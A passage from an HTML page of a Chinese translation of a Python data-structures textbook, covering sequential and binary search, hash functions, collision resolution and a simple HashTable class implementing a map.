class="keyword">not</span> stop:</div><div class="line">        <span class="keyword">if</span> alist[pos]==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> alist[pos]&gt;item:</div><div class="line">                stop=<span class="keyword">True</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                pos=pos+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> found</div><div class="line"></div><div class="line">testlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">42</span>,]</div><div class="line">print(orderedSequentialSearch(testlist, <span class="number">3</span>))</div><div class="line">print(orderedSequentialSearch(testlist, <span class="number">13</span>))</div></pre></td></tr></table></figure><p><em>CodeLens 2</em></p><p>Table 2总结了这些结果。请注意，在最好的情况下，我们通过只查看一项会发现该项不在列表中。平均来说，我们将只了解n/2项就知道。然而，这种复杂度仍然是O(n)。总之，只有在我们没有找到该项的情况下，才通过对列表排序来改进顺序查找。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/assets/5.3.%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE.table2.png" alt="image"></p><p><em>Table 2</em></p><h3 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h3><p>有序列表对于我们的比较是很有用的。在顺序查找中，当我们与第一个项进行比较时，如果第一个项不是我们要查找的，则最多还有n-1个项目。二分查找从中间项开始，而不是按顺序查找列表。如果该项是我们正在寻找的项，我们就完成了查找。如果它不是，我们可以使用列表的有序性质来消除剩余项的一半。如果我们正在查找的项大于中间项，就可以消除中间项以及比中间项小的一半元素。如果该项在列表中，肯定在大的那半部分。</p><p>然后我们可以用大的半部分重复这个过程。从中间项开始，将其与我们正在寻找的内容进行比较。再次，我们找到元素或将列表分成两半，消除可能的搜索空间的另一部分。Figure 3展示了该算法如果快速找到值54。完整的函数见CodeLens 3中。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.4.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/assets/5.4.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.figure3.png" alt="image"></p><p><em>Figure 3</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(alist,item)</span>:</span></div><div class="line">    first=<span class="number">0</span></div><div class="line">    last=len(alist)<span class="number">-1</span></div><div class="line">    found=<span class="keyword">False</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> first&lt;=last <span class="keyword">and</span> <span class="keyword">not</span> found:</div><div class="line">        midpoint=(first+last)//<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> alist[midpoint]==item:</div><div class="line">            found=<span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> item&lt;alist[midpoint]:</div><div class="line">                last=midpoint<span class="number">-1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                first=midpoint+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> found</div><div class="line">  </div><div class="line">testlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">42</span>,]</div><div class="line">print(binarySearch(testlist, <span class="number">3</span>))</div><div class="line">print(binarySearch(testlist, <span class="number">13</span>))</div></pre></td></tr></table></figure><p><em>CodeLens 3</em></p><p>在我们继续分析之前，我们应该注意到，这个算法是分而治之策略的一个很好的例子。分和治意味着我们将问题分成更小的部分，以某种方式解决更小的部分，然后重新组合整个问题以获得结果。当我们执行列表的二分查找时，我们首先检查中间项。如果我们正在搜索的项小于中间项，我们可以简单地对原始列表的左半部分执行二分查找。同样，如果项大，我们可以执行右半部分的二分查找。无论哪种方式，都是递归调用二分查找函数。CodeLens 4展示了这个递归版本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(alist,item)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(alist)==<span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        midpoint=len(alist)//<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> alist[midpoint]==item:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> item&lt;alist[midpoint]:</div><div class="line">                <span class="keyword">return</span> binarySearch(alist[:midpoint],item)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">return</span> binarySearch(alist[midpoint+<span class="number">1</span>:],item)</div><div class="line">            </div><div class="line">testlist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">32</span>, <span class="number">42</span>,]</div><div class="line">print(binarySearch(testlist, <span class="number">3</span>))</div><div class="line">print(binarySearch(testlist, <span class="number">13</span>))</div></pre></td></tr></table></figure><p><em>CodeLens 4</em></p><h3 id="二分查找分析"><a href="#二分查找分析" class="headerlink" title="二分查找分析"></a>二分查找分析</h3><p>为了分析二分查找算法，我们需要记住，每个比较消除了大约一半的剩余项。该算法检查整个列表的最大比较数是多少？如果我们从n项开始，大约n/2项将在第一次比较后留下。第二次比较后，会有约n/4。然后n/8,n/16,等等。我们可以拆分列表多少次？Table 3帮助我们找到答案。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.4.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/assets/5.4.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.table3.png" alt="image"></p><p><em>Table 3</em></p><p>当我们切分列表足够多次时，我们最终得到只有一个项的列表。要么是我们正在寻找的项，要么不是。达到这一点所需的比较数是i，当n/2^i=1时。求解i得出i=log^n。最大比较数相对于列表中的项是对数的。因此，二分查找是O(log^n)。</p><p>还需要解决一个额外的分析问题。在上面所示的递归解中，递归调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binarySearch(alist[:midpoint],item)</div></pre></td></tr></table></figure><p>使用切片运算符创建列表的左半部分，然后传递到下一个调用（同样对于右半部分）。我们上面做的分析假设切片操作符是恒定时间的。然而，我们知道Python中的slice运算符实际上是O(k)。这意味着使用slice的二分查找将不会在严格的对数时间执行。幸运的是，这可以通过传递列表连同开始和结束索引来纠正。可以像CodeLens 3中所做的那样计算索引。我们将此实现作为练习。</p><p>即使二分查找通常比顺序查找更好，但重要的是要注意，对于小的n值，排序的额外成本可能不值得。事实上，我们应该经常考虑采取额外的分类工作是否使搜索获得好处。如果我们可以排序依次，然后查找多次，排序的成本就不那么重要。然而，对于大型列表，一次排序可能是非常昂贵，从一开始就执行顺序查找可能是最好的选择。</p><h3 id="Hash查找"><a href="#Hash查找" class="headerlink" title="Hash查找"></a>Hash查找</h3><p>在前面的部分中，我们通过利用关于项在集合中相对于彼此存储的位置的信息，改进我们的搜索算法。例如，通过指导列表是有序的，我们可以使用二分查找在对数时间中搜索。在本节中，我们将尝试进一步建立一个可以在O(1)时间内搜索的数据结构。这个概念被称为Hash查找。</p><p>为了做到这一点，当我们在集合中查找项时，我们需要更多地了解项可能在哪里。如果每个项都在应该在的地方，那么搜索可以使用单个比较就能发现项的存在。然而，我们看到，通常不是这样的。</p><p><code>哈希表</code> 是以一种容易找到它们的方式存储的项的集合。哈希表的每个位置，通常称为一个槽，可以容纳一个项，并且由从 0 开始的整数值命名。例如，我们有一个名为 0 的槽，名为 1 的槽，名为 2 的槽，以上。最初，哈希表不包含项，因此每个槽都为空。我们可以通过使用列表来实现一个哈希表，每个元素初始化为<code>None</code> 。Figure 4 展示了大小 m = 11 的哈希表。换句话说，在表中有 m 个槽，命名为 0 到 10。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>项和该项在散列表中所属的槽之间的映射被称为 <code>hash 函数</code>。 hash 函数将接收集合中的任何项，并在槽名范围内（0和 m-1之间）返回一个整数。假设我们有整数项 <code>54,26,93,17,77</code> 和 <code>31</code> 的集合。我们的第一个 hash 函数，有时被称为 <code>余数法</code> ，只需要一个项并将其除以表大小，返回剩余部分作为其散列值<code>（h(item) = item％11）</code>。 Table 4 给出了我们的示例项的所有哈希值。注意，这种余数方法（模运算）通常以某种形式存在于所有散列函数中，因为结果必须在槽名的范围内。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.table4.png" alt="image"></p><p><em>Table 4</em></p><p>一旦计算了哈希值，我们可以将每个项插入到指定位置的哈希表中，如Figure 5所示。注意，11个插槽中6个现在已被占用。这被称为负载因子，通常表示为 <code>λ=项数/表大小</code>, 在这个例子中，<code>λ = 6/11</code> 。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p>现在，当我们要搜索一个项时，我们只需使用哈希函数来计算项的槽名称，然后检查哈希表以查看它是否存在。该搜索操作是 O(1)，因为需要恒定的时间量来计算散列值，然后在该位置索引散列表。如果一切都正确的话，我们已经找到了一个恒定时间搜索算法。</p><p>你可能已经看到，只有每个项映射到哈希表中的唯一位置，这种技术才会起作用。 例如，如果项 44 是我们集合中的下一个项，则它的散列值为<code>0（44％11 == 0）</code>。 因为 77 的哈希值也是 0，我们会有一个问题。根据散列函数，两个或更多项将需要在同一槽中。这种现象被称为碰撞（它也可以被称为“冲突”）。显然，冲突使散列技术产生了问题。我们将在后面详细讨论。</p><h3 id="hash函数"><a href="#hash函数" class="headerlink" title="hash函数"></a>hash函数</h3><p>给定项的集合，将每个项映射到唯一槽的散列函数被称为完美散列函数。如果我们知道项和集合将永远不会改变，那么可以构造一个完美的散列函数。不幸的是，给定任意的项集合，没有系统的方法来构建完美的散列函数。幸运的是，我们不需要散列函数是完美的，仍然可以提高性能。</p><p>总是具有完美散列函数的一种方式是增加散列表的大小，使得可以容纳项范围中的每个可能值。这保证每个项将具有唯一的槽。虽然这对于小数目的项是实用的，但是当可能项的数目大时是不可行的。例如，如果项是九位数的社保号码，则此方法将需要大约十亿个槽。如果我们只想存储25名学生的数据，我们将浪费大量内存。</p><p>我们的目标是创建一个散列函数，最大限度地减少冲突数，易于计算，并均匀分布在哈希表中的项。有很多常用的方法来扩展简单余数法。我们将在这里介绍其中几个。</p><p><code>分组求和法</code> 将项划分为相等大小的块（最后一块可能不是相等大小）。然后将这些块加在一起以求出散列值。例如，如果我们的项是电话号码 <code>436-555-4601</code>，我们将取出数字，并将它们分成2位数<code>（43,65,55,46,01）</code>。<code>43 + 65 + 55 + 46 + 01</code>，我们得到 210。我们假设哈希表有11个槽，那么我们需要除以11。在这种情况下，210%11为1，因此电话号码 <code>436-555-4601</code> 散列到槽 1 。一些分组求和法会在求和之前每隔一个反转。对于上述示例，我们得到<code>43 + 56 + 55 + 64 + 01 = 219</code>，其给出<code>219％11 = 10</code> 。</p><p>用于构造散列函数的另一数值技术被称为<code>平方取中法</code>。我们首先对该项平方，然后提取一部分数字结果。例如，如果项是44，我们将首先计算 <code>44^2 = 1,936</code> 。通过提取中间两个数字 <code>93</code> ，我们得到 <code>5（93％11）</code>。Table 5 展示了余数法和中间平方法下的项。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.table5.png" alt="image"></p><p><em>Table 5</em></p><p>我们还可以为基于字符的项（如字符串）创建哈希函数。词 <code>cat</code> 可以被认为是 ascii 值的序列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'c'</span>)</div><div class="line"><span class="number">99</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'a'</span>)</div><div class="line"><span class="number">97</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(<span class="string">'t'</span>)</div><div class="line"><span class="number">116</span></div></pre></td></tr></table></figure><p>然后，我们可以获取这三个ascii值，将它们相加，并使用余数方法获取散列值（参见Figure 6）。Listing 1展示了一个名为hash的函数，它接收字符串和表大小作为参数，并返回从 <code>0</code> 到 <code>tablesize-1</code> 的范围内的散列值。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.table5-1.png" alt="image"></p><p> <em>Figure 6</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(astring,tablesize)</span>:</span></div><div class="line">    sum=<span class="number">0</span></div><div class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(len(astring)):</div><div class="line">        sum=sum+ord(astring[pos])</div><div class="line">        </div><div class="line">        </div><div class="line">    <span class="keyword">return</span> sum%tablesize</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>有趣的是，当使用此散列函数时，字符串总是返回相同的散列值。为了弥补这一点，我们可以使用字符的位置作为权重。Figure 7展示了使用位置值作为加权因子的一种可能的方式。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure7.png" alt="image"></p><p><em>Figure 7</em></p><p>你可以思考一些其他方法来计算集合中项的散列值。重要的是要记住，哈希函数必须是高效的，以便它不会成为存储和搜索过程的主要部分。如果哈希函数太复杂，则计算槽名称的程序要比之前所述的简单地进行基本的顺序或二分搜索更耗时。 这将打破散列的目的。</p><h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>我们现在回到碰撞的问题。当两个项散列到同一个槽时，我们必须有一个系统的方法将第二个项放在散列表中。这个过程称为冲突解决。如前所述，如果散列函数是完美的，冲突将永远不会发生。然而，由于这通常是不可能的，所以冲突解决成为散列非常重要的部分。</p><p>解决冲突的一种方法是查找散列表，尝试查找到另一个空槽以保存导致冲突的项。一个简单的方法是从原始哈希值位置开始，然后以顺序方式移动槽，直到遇到第一个空槽。注意，我们可能需要回到第一个槽（循环）以查找整个散列表。这种冲突解决过程被称为开放寻址，因为它试图在散列表中找到下一个空槽或地址。通过系统地一次访问每个槽，我们执行称为线性探测的开放寻址技术。</p><p>Figure 8展示了在简单余数法散列函数<code>（54,26,93,17,77,31,44,55,20）</code> 下的整数项的扩展集合。上面的 Table 4 展示了原始项的哈希值。Figure 5 展示了原始内容。当我们尝试将 <code>44</code> 放入槽 0 时，发生冲突。在线性探测下，我们逐个顺序观察，直到找到位置。在这种情况下，我们找到槽 1。</p><p>再次，<code>55</code> 应该在槽 0 中，但是必须放置在槽 2 中，因为它是下一个开放位置。值 20 散列到槽 9 。由于槽 9 已满，我们进行线性探测。我们访问槽<code>10,0,1</code>和 <code>2</code>，最后在位置 3 找到一个空槽。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure8.png" alt="image"></p><p><em>Figure 9</em></p><p>处理聚集的一种方式是扩展线性探测技术，使得不是顺序地查找下一个开放槽，而是跳过槽，从而更均匀地分布已经引起冲突的项。这将潜在地减少发生的聚集。 Figure 10 展示了使用 <code>加3</code> 探头进行碰撞识别时的项。 这意味着一旦发生碰撞，我们将查看第三个槽，直到找到一个空。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure10.png" alt="image"></p><p><em>Figure 10</em></p><p>在冲突后寻找另一个槽的过程叫 <code>重新散列</code>。使用简单的线性探测，rehash 函数是 <code>newhashvalue = rehash(oldhashvalue)</code>其中 <code>rehash(pos)=(pos + 1)％sizeoftable</code>。 <code>加3</code>rehash 可以定义为<code>rehash(pos)=(pos + 3)％sizeoftable</code>。一般来说，<code>rehash(pos)=(pos + skip)％sizeoftable</code>。重要的是要注意，“跳过”的大小必须使得表中的所有槽最终都被访问。否则，表的一部分将不被使用。为了确保这一点，通常建议表大小是素数。这是我们在示例中使用 11 的原因。</p><p>线性探测思想的一个变种称为二次探测。代替使用常量 “跳过” 值，我们使用rehash 函数，将散列值递增 <code>1，3，5，7，9，</code> 依此类推。这意味着如果第一哈希值是 <code>h</code>，则连续值是<code>h + 1，h + 4，h + 9，h + 16</code>，等等。换句话说，二次探测使用由连续完全正方形组成的跳跃。Figure 11 展示了使用此技术放置之后的示例值。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure11.png" alt="image"></p><p><em>Figure 11</em></p><p>用于处理冲突问题的替代方法是允许每个槽保持对项的集合（或链）的引用。链接允许许多项存在于哈希表中的相同位置。当发生冲突时，项仍然放在散列表的正确槽中。随着越来越多的项哈希到相同的位置，搜索集合中的项的难度增加。 Figure 12 展示了添加到使用链接解决冲突的散列表时的项。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/5.%E6%8E%92%E5%BA%8F%E5%92%8C%E6%90%9C%E7%B4%A2/5.5.Hash%E6%9F%A5%E6%89%BE/assets/5.5.Hash%E6%9F%A5%E6%89%BE.figure12.png" alt="image"></p><p><em>Figure 12</em></p><p>当我们要搜索一个项时，我们使用散列函数来生成它应该在的槽。由于每个槽都有一个集合，我们使用一种搜索技术来查找该项是否存在。优点是，平均来说，每个槽中可能有更少的项，因此搜索可能更有效。我们将在本节结尾处查看散列的分析。</p><h3 id="实现map抽象数据类型"><a href="#实现map抽象数据类型" class="headerlink" title="实现map抽象数据类型"></a>实现map抽象数据类型</h3><p>最有用的Python集合之一是字典。回想一下，字典是一种关联数据类型，你可以在其中存储建-值对。该键用于查找关联的值。我们经常将这个想法称为map。</p><p>map 抽象数据类型定义如下。该结构是键与值之间的关联的无序集合。map 中的键都是唯一的，因此键和值之间存在一对一的关系。操作如下。</p><ul><li>Map() 创建一个新的 map 。它返回一个空的 map 集合。</li><li>put(key，val) 向 map 中添加一个新的键值对。如果键已经在 map 中，那么用新值替换旧值。</li><li>get(key) 给定一个键，返回存储在 map 中的值或 None。</li><li>del 使用 <code>del map[key]</code> 形式的语句从 map 中删除键值对。</li><li>len() 返回存储在 map 中的键值对的数量。</li><li>in 返回 True 对于 <code>key in map</code> 语句，如果给定的键在 map 中，否则为False。</li></ul><p>字典一个很大的好处是，给定一个键，我们可以非常快速地查找相关的值。为了提供这种快速查找能力，我们需要一个支持高效搜索的实现。我们可以使用具有顺序或二分查找的列表，但是使用如上所述的哈希表将更好，因为查找哈希表中的项可以接近 O(1) 性能。</p><p>在listing 2中，我们使用两个列表来创建一个实现Map抽象数据类型的HashTable类。一个名为slots的列表将保存键项，一个称为data的并行列表将保存数据值。当我们查找一个键时，data列表中相应位置将保存相关的数据值。我们将使用前面提出的想法将键列表视为哈希表。注意，哈希表的初始大小已经被选择为11。尽管这是任意的，但是重要的是，大小是质数，使得冲突解决算法可以尽可能高效。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">HashTable</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.size=<span class="number">11</span></div><div class="line">        self.slots=[<span class="keyword">None</span>]*self.size</div><div class="line">        self.data=[<span class="keyword">None</span>]*self.size</div></pre></td></tr></table></figure><p><em>Listing 2</em></p><p>hash 函数实现简单的余数方法。冲突解决技术是 <code>加1</code> rehash 函数的线性探测。 put 函数（见 Listing 3）假定最终将有一个空槽，除非 key 已经存在于 <code>self.slots</code> 中。 它计算原始哈希值，如果该槽不为空，则迭代 rehash 函数，直到出现空槽。如果非空槽已经包含 key，则旧数据值将替换为新数据值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self,key,data)</span>:</span></div><div class="line">  hashvalue = self.hashfunction(key,len(self.slots))</div><div class="line"></div><div class="line">  <span class="keyword">if</span> self.slots[hashvalue] == <span class="keyword">None</span>:</div><div class="line">    self.slots[hashvalue] = key</div><div class="line">    self.data[hashvalue] = data</div><div class="line">  <span class="keyword">else</span>:</div><div class="line">    <span class="keyword">if</span> self.slots[hashvalue] == key:</div><div class="line">      self.data[hashvalue] = data  <span class="comment">#replace</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      nextslot = self.rehash(hashvalue,len(self.slots))</div><div class="line">      <span class="keyword">while</span> self.slots[nextslot] != <span class="keyword">None</span> <span class="keyword">and</span> \</div><div class="line">                      self.slots[nextslot] != key:</div><div class="line">        nextslot = self.rehash(nextslot,len(self.slots))</div><div class="line"></div><div class="line">      <span class="keyword">if</span> self.slots[nextslot] == <span class="keyword">None</span>:</div><div class="line">        self.slots[nextslot]=key</div><div class="line">        self.data[nextslot]=data</div><div class="line">      <span class="keyword">else</span>:</div><div class="line">        self.data[nextslot] = data <span class="comment">#replace</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hashfunction</span><span class="params">(self,key,size)</span>:</span></div><div class="line">     <span class="keyword">return</span> key%size</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rehash</span><span class="params">(self,oldhash,size)</span>:</span></div><div class="line">    <span class="keyword">return</span> (oldhash+<span class="number">1</span>)%size</div></pre></td></tr></table></figure><p><em>Listing 3</em></p><p>同样，get 函数（见 Listing 4）从计算初始哈希值开始。如果值不在初始槽中，则 rehash 用于定位下一个可能的位置。注意，第 15 行保证搜索将通过检查以确保我们没有返回到初始槽来终止。如果发生这种情况，我们已用尽所有可能的槽，并且项不存在。</p><p>HashTable 类提供了附加的字典功能。我们重载 <code>__getitem__</code> 和<code>__setitem__</code> 方法以允许使用 <code>[]</code> 访问。 这意味着一旦创建了HashTable，索引操作符将可用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self,key)</span>:</span></div><div class="line">  startslot = self.hashfunction(key,len(self.slots))</div><div class="line"></div><div class="line">  data = <span class="keyword">None</span></div><div class="line">  stop = <span class="keyword">False</span></div><div class="line">  found = <span class="keyword">False</span></div><div class="line">  position = startslot</div><div class="line">  <span class="keyword">while</span> self.slots[position] != <span class="keyword">None</span> <span class="keyword">and</span>  \</div><div class="line">                       <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">not</span> stop:</div><div class="line">     <span class="keyword">if</span> self.slots[position] == key:</div><div class="line">       found = <span class="keyword">True</span></div><div class="line">       data = self.data[position]</div><div class="line">     <span class="keyword">else</span>:</div><div class="line">       position=self.rehash(position,len(self.slots))</div><div class="line">       <span class="keyword">if</span> position == startslot:</div><div class="line">           stop = <span class="keyword">True</span></div><div class="line">  <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self,key)</span>:</span></div><div class="line">    <span class="keyword">return</span> self.get(key)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self,key,data)</span>:</span></div><div class="line">    self.put(key,data)</div></pre></td></tr></table></figure><p><em>Listing 4</em></p><p>下面的会话展示了 HashTable 类的操作。首先，我们将创建一个哈希表并存储一些带有整数键和字符串数据值的项。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>H=HashTable()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">54</span>]=<span class="string">"cat"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">26</span>]=<span class="string">"dog"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">93</span>]=<span class="string">"lion"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">17</span>]=<span class="string">"tiger"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">77</span>]=<span class="string">"bird"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">31</span>]=<span class="string">"cow"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">44</span>]=<span class="string">"goat"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">55</span>]=<span class="string">"pig"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H[<span class="number">20</span>]=<span class="string">"chicken"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H.slots</div><div class="line">[<span class="number">77</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">20</span>, <span class="number">26</span>, <span class="number">93</span>, <span class="number">17</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="number">31</span>, <span class="number">54</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>H.data</div><div class="line">[<span class="string">'bird'</span>, <span class="string">'goat'</span>, <span class="string">'pig'</span>, <span class="string">'chicken'</span>, <span class="string">'dog'</span>, <span class="string">'lion'</span>,</div><div class="line">       <span class="string">'tiger'</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="string">'cow'</span>, <span class="string">'cat'</span>]</div></pre></td></tr></table></figure><p>接下来，我们将访问和修改哈希表中的一些项。注意，正替换键 20 的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div 